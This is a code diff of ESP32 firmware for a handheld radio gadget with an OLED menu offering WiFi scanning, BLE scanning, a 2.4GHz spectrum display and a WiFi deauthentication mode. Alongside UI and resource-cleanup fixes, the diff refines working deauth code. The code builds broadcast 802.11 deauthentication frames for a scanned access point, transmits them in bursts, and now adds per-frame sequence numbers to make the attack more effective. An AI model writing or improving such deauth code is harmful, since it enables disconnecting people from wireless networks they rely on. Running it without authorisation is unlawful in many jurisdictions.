@@ -112,9 +112,9 @@ static void menu_draw() {
 }
 
 static void menu_handle() {
-    menu_draw();
     if (pressed_next()) menuSel = (menuSel + 1) % MENU_COUNT;
     if (pressed_sel())  mode = (Mode)(menuSel + 1);
+    menu_draw();
 }
 
 // ─────────────────────────────────────────────────
@@ -143,7 +143,7 @@ static void wifi_scan_handle() {
             oled_header("WiFi Scan");
             oled.println("Scanning... SEL=cancel");
             oled.display();
-            if (pressed_sel()) { WiFi.scanDelete(); wifiScanPending = false; mode = MENU; }
+            if (pressed_sel()) { wifiScanPending = false; mode = MENU; }
             return;
         }
         wifiCount       = (result < 0) ? 0 : result;
@@ -171,7 +171,7 @@ static void wifi_scan_handle() {
 
     // [fix #6] clamp — last page never shows blank lines
     if (pressed_next()) wifiScroll = min(wifiScroll + 1, max(0, wifiCount - 3));
-    if (pressed_sel())  { WiFi.scanDelete(); mode = MENU; }
+    if (pressed_sel())  { mode = MENU; }
 }
 
 // ─────────────────────────────────────────────────
@@ -183,14 +183,15 @@ static uint8_t deauth_frame[26] = {
     0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: broadcast
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA: BSSID (filled at runtime)
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled at runtime)
-    0xF0, 0xFF,                         // Sequence
+    0x00, 0x00,                         // Sequence control (set per-frame in deauth_send)
     0x07, 0x00,                         // Reason: class3 from nonassoc STA
 };
 
-static int  deauthCount       = 0;
-static int  deauthIdx         = 0;
-static bool deauthActive      = false;
-static bool deauthScanPending = false;
+static int      deauthCount       = 0;
+static int      deauthIdx         = 0;
+static bool     deauthActive      = false;
+static bool     deauthScanPending = false;
+static uint16_t deauthSeqNum      = 0;
 
 static void deauth_enter() {
     WiFi.mode(WIFI_STA);
@@ -211,6 +212,10 @@ static void deauth_send(uint8_t* bssid, uint8_t channel) {
     memcpy(&deauth_frame[10], bssid, 6);
     memcpy(&deauth_frame[16], bssid, 6);
     for (int i = 0; i < 10; i++) {
+        uint16_t sc = (deauthSeqNum & 0xFFF) << 4;  // fragment bits = 0
+        deauth_frame[22] = sc & 0xFF;
+        deauth_frame[23] = (sc >> 8) & 0xFF;
+        deauthSeqNum     = (deauthSeqNum + 1) & 0xFFF;
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
         delayMicroseconds(150);
     }
@@ -224,7 +229,7 @@ static void deauth_handle() {
         oled.println("Scanning... SEL=cancel");
         oled.display();
         if (result == WIFI_SCAN_RUNNING) {
-            if (pressed_sel()) { WiFi.scanDelete(); deauthScanPending = false; mode = MENU; }
+            if (pressed_sel()) { deauthScanPending = false; mode = MENU; }
             return;
         }
         deauthCount       = (result < 0) ? 0 : result;
@@ -237,7 +242,7 @@ static void deauth_handle() {
         oled.println("No networks found");
         oled.println("SEL=back");
         oled.display();
-        if (pressed_sel()) { WiFi.scanDelete(); mode = MENU; }
+        if (pressed_sel()) { mode = MENU; }
         return;
     }
 
@@ -260,7 +265,6 @@ static void deauth_handle() {
         deauth_send(WiFi.BSSID(deauthIdx), (uint8_t)WiFi.channel(deauthIdx));
         if (pressed_sel()) {
             deauthActive = false;
-            WiFi.scanDelete();
             mode = MENU;
         }
     }
@@ -269,9 +273,15 @@ static void deauth_handle() {
 // ─────────────────────────────────────────────────
 // 3. BLE SCAN
 // ─────────────────────────────────────────────────
-static BLEScan*       bleScan   = nullptr;
-static BLEScanResults bleResults;
-static int            bleIdx    = 0;
+static BLEScan*          bleScan     = nullptr;
+static BLEScanResults    bleResults;
+static int               bleIdx      = 0;
+static volatile bool     bleScanDone = false;
+
+static void onBleScanComplete(BLEScanResults results) {
+    bleResults  = results;
+    bleScanDone = true;   // written from BLE task; volatile ensures loop() sees it
+}
 
 static void ble_scan_enter() {
     WiFi.mode(WIFI_OFF);
@@ -281,15 +291,26 @@ static void ble_scan_enter() {
     bleScan->setActiveScan(true);
     bleScan->setInterval(100);
     bleScan->setWindow(99);
-    bleIdx = 0;
+    bleIdx      = 0;
+    bleScanDone = false;
 
     oled_header("BLE Scan");
     oled.println("Scanning 3s...");
+    oled.println("SEL=cancel");
     oled.display();
-    bleResults = bleScan->start(3, false);
+    bleScan->start(3, onBleScanComplete, false);  // non-blocking; loop stays responsive
 }
 
 static void ble_scan_handle() {
+    if (!bleScanDone) {
+        oled_header("BLE Scan");
+        oled.println("Scanning 3s...");
+        oled.println("SEL=cancel");
+        oled.display();
+        if (pressed_sel()) { mode = MENU; }  // on_mode_exit stops scan + cleans up
+        return;
+    }
+
     int count = bleResults.getCount();
     oled_header("BLE Scan");
     oled.print(count); oled.println(" devices");
@@ -310,12 +331,7 @@ static void ble_scan_handle() {
     oled.display();
 
     if (pressed_next()) bleIdx = (bleIdx + 1) % max(1, count);
-    if (pressed_sel()) {
-        bleScan->clearResults();
-        BLEDevice::deinit(true);
-        bleScan = nullptr;
-        mode = MENU;
-    }
+    if (pressed_sel())  { mode = MENU; }
 }
 
 // ─────────────────────────────────────────────────
@@ -331,7 +347,6 @@ static void nrf_spectrum_enter() {
     memset(nrfPower, 0, sizeof(nrfPower));
     nrfOk = radio.begin();
     if (!nrfOk) {
-        radio.powerDown();              // [fix #2] safe call on failed init
         oled_header("NRF Spectrum");
         oled.println("NRF24 not found!");
         oled.println("Check wiring.");
@@ -366,8 +381,8 @@ static void nrf_draw() {
     oled.setTextColor(SSD1306_WHITE);
     oled.setCursor(0, 0);
     oled.println("2.4GHz Spectrum");
-    const uint8_t BAR_TOP = 10;
-    const uint8_t BAR_H   = 54;
+    const uint8_t BAR_TOP = 12;
+    const uint8_t BAR_H   = 52;
     // [fix #14] group every 2 channels → 63 pairs × 2px = 126px, no collision
     for (uint8_t pair = 0; pair < NRF_CH_COUNT / 2; pair++) {
         uint8_t avg = ((uint16_t)nrfPower[pair * 2] + nrfPower[pair * 2 + 1]) / 2;
@@ -409,10 +424,12 @@ static void on_mode_exit(Mode leaving) {
             break;
         case BLE_SCAN:
             if (bleScan) {
+                bleScan->stop();         // halt any in-progress async scan
                 bleScan->clearResults();
                 BLEDevice::deinit(true);
                 bleScan = nullptr;
             }
+            bleScanDone = false;
             break;
         case NRF_SPECTRUM:
             if (nrfOk) { radio.powerDown(); nrfOk = false; }
